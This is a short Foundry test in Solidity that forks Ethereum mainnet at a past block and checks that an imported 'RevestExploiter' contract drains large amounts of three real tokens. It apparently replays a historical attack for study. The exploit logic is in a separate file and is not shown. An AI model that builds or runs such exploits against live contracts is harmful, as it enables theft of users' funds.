// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RevestExploiter.sol";

contract RevestTest is Test {
    IERC20Like private constant RENA = IERC20Like(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
    IERC20Like private constant BLOCKS = IERC20Like(0x8a6D4C8735371EBAF8874fBd518b56Edd66024eB);
    IERC20Like private constant ECO = IERC20Like(0xC242Eb8e4E27EAE6a2A728A41201152F19595C83);

    RevestExploiter exploiter;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 14465356);

        exploiter = new RevestExploiter();
    }

    function testExploit() public {
        exploiter.exploit();

        assertTrue(RENA.balanceOf(address(exploiter)) > 356_399e18);
        assertTrue(BLOCKS.balanceOf(address(exploiter)) > 714_999_999e18);
        assertTrue(ECO.balanceOf(address(exploiter)) > 7_699_999e18);
    }
}
